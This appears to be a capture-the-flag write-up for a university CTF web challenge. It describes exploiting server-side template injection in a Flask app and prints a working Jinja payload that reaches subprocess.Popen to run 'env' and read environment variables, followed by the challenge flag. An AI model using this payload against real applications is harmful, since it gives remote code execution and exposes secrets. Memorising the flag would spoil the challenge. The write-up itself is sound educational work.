# web / web3

> Points: 3156

## Question


> <https://ctf.csclub.uwaterloo.ca/web/5/>

## Solution

We are provided a flask application which is vulnerable to SSTI. Using the method resolution order and subclasses, we can go overkill and locate the `<subprocess.Popen>` class to obtain remote code execution. Now, we can check the environment variables via `env` and obtain the flag. The query url looks like:

```
https://ctf.csclub.uwaterloo.ca/web/5/query/{{''.__class__.mro()[1].__subclasses__()[363]('env',shell=True,stdout=-1).communicate()[0].strip().decode()}}
```


### Flag

`uwctf{bb13f2e74b255934}`
